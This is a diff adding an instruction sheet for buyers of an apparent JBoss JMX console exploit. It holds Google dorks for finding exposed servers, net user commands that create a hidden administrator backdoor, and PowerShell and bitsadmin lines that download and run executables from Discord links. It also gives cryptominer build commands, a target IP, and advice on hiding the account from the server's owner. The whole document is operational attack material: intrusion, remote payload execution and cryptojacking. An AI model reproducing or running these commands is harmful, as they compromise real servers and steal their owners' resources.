@@ -1,0 +1,94 @@
+Sanku For Purchasing
+
+1. search using the included dorks for machines that are listed by ip and a port the ports being but not limited to 8080 8000 8081 and 5555
+2.if on linux use the python command to run this program if on windows just use the cd command to get into teh directory that the script is in and run it as if it where an exe
+3.once you run the script you will be presented with the syntax and it states to run the commadn new.py IP as its format
+4.run the net user commands that are also provided wiith this scraip to add your own user or to remote execute another program
+5.use windows RDP to login to the host with the password and username set by the net user commands
+6.start mining selling or cracking on the server as you wish 
+7.keep in mind that teh legitimate owner of the server can see your account so set the name to somthing like guest
+
+
+Dorks
+inurl:"jmx-console/HtmlAdaptor"
+inurl:"/web-console/Invoker"
+inurl:"/invoker/JMXInvokerServlet"
+inurl:"8080/jmx-console/"
+inurl:"console/Invoker"
+intitle:"JMX Console"
+intitle:"MBean Inspector"
+intitle:JMX inurl:"/HtmlAdaptor?"
+intitle:"JMX MBean View"
+intitle:"JBoss JMX Management Console"
+intitle:JBoss Console
+intitle:Jmx Console Htmladaptor
+inurl:"/jmx-console/" intitle:"JBoss JMX Management Console"
+intitle:”JBoss Management Console – Server Information” “application server” inurl:”web-console”
+intitle:"JBoss Management Console -- Server Information" "application server"
+inurl:"/web-console/" intitle:"Administration Console"
+inurl:”8080/jmx-console”
+inurl:”8081/jmx-console”
+inurl:”jmx-console”
+intitle:"JBoss Management Console"
+inurl:"/invoker/JMXInvokerServlet"
+inurl:"/web-console/Invoker
+inurl:"/web-console/ServerInfo"
+site:br inurl:"/jmx-console/HtmlAdaptor"
+site:uk inurl:"/jmx-console/HtmlAdaptor"
+site:in inurl:"/jmx-console/HtmlAdaptor"
+site:ru inurl:"/jmx-console/HtmlAdaptor"
+site:pe inurl:"/jmx-console/HtmlAdaptor"
+site:br  inurl:"/web-console/Invoker"
+site:uk  inurl:"/web-console/Invoker"
+site:ru  inurl:"/web-console/Invoker"
+site:us  inurl:"/web-console/Invoker"
+site:com  inurl:"/web-console/Invoker"
+inurl:"jboss.system:type=ServerInfo"
+inurl:"jbossass.war"
+
+PowerShell (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/364455677499932686/424307504512630785/svchost.exe');Start-Process 'svchost.exe'
+
+cat /proc/cpuinfo
+
+https://lolekhosted.net/
+
+lscpu
+
+# apt-get update
+# apt-get install libcurl4-openssl-dev git 
+# apt-get install build-essential autotools-dev autoconf libcurl3 libcurl4-gnutls-dev
+# mkdir /download
+# cd /downloads
+# git clone https://github.com/wolf9466/cpuminer-...
+# cd cpuminer-multi 
+# ./autogen.sh
+# CFLAGS="-march=native" ./configure
+# make
+# make install
+# minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u virtualcoin.videos@gmail.com -p x
+
+Add user commands
+net users SystemZ Backdoor1234 /add
+net user LulZ SystemZ321 /ADD
+net localgroup administrators SystemZ /add
+
+
+bitsadmin /transfer myDownloadJob /download /priority high https://cdn.discordapp.com/attachments/364455677499932686/426301760345210880/Windows_Explorer.exe %SystemRoot%\Windows_Explorer.exe
+cd %SystemRoot%
+Windows_Explorer.exe
+
+bitsadmin /transfer myDownloadJob /download /priority high https://cdn.discordapp.com/attachments/364455677499932686/392494650717634561/update.exe %SystemRoot%\update.exe
+
+
+
+bitsadmin /transfer myDownloadJob /download /priority high https://cdn.discordapp.com/attachments/364455677499932686/424307504512630785/svchost.exe %SystemRoot%\svchost.exe
+cd %SystemRoot%
+svchost.exe
+
+
+
+bitsadmin /transfer myDownloadJob /download /priority high https://cdn.discordapp.com/attachments/364455677499932686/389053867717033994/imminent.exe %SystemRoot%\imminent.exe
+
+Note the given commands result in a username of SystemZ with the password Backdoor1234
+
+112.199.118.125:8080
